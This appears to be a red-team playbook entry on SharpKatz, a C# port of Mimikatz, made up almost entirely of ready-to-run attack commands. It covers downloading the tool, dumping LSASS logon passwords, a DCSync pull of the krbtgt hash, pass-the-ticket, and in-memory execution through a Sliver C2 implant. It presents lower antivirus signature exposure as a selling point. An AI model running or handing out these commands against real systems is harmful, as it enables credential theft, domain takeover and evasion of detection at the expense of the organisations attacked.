# 03.34 SharpKatz

> C# port of common Mimikatz commands — Logon Passwords DCSync Kerberos tickets without dropping mimikatz.exe.

## Overview

SharpKatz is a C# implementation of the most-used Mimikatz functionality: logonpasswords, lsadump::dcsync, kerberos::list, kerberos::ptt. The advantage over running mimikatz.exe: a single .NET assembly that runs via execute-assembly, smaller footprint, lower signature exposure than the well-known mimikatz binary. Lacks some advanced Mimikatz features (kerberos::golden has limited options).

## Steps

- **Step 1** - Get binary or compile.
- **Step 2** - Run as admin (SeDebugPrivilege needed for LSASS dump).
- **Step 3** - Execute-assembly via Sliver/Cobalt for in-memory.

## Commands

### Get binary

```powershell
iwr 'https://github.com/b4rtik/SharpKatz/releases/latest/download/SharpKatz.exe' -OutFile SharpKatz.exe
```

### Dump LSASS logon passwords

```powershell
SharpKatz.exe --Command logonpasswords
```

### DCSync — pull a user's hash

```powershell
SharpKatz.exe --Command dcsync --User krbtgt --Domain <DOMAIN>.local --DomainController <DC-FQDN>
```

### List Kerberos tickets in session

```powershell
SharpKatz.exe --Command klist
```

### Pass the ticket

```powershell
SharpKatz.exe --Command ptt --Ticket <BASE64-KIRBI>
```

### Sliver execute-assembly

```text
[sliver] $ execute-assembly /opt/tools/SharpKatz.exe --Command logonpasswords
```
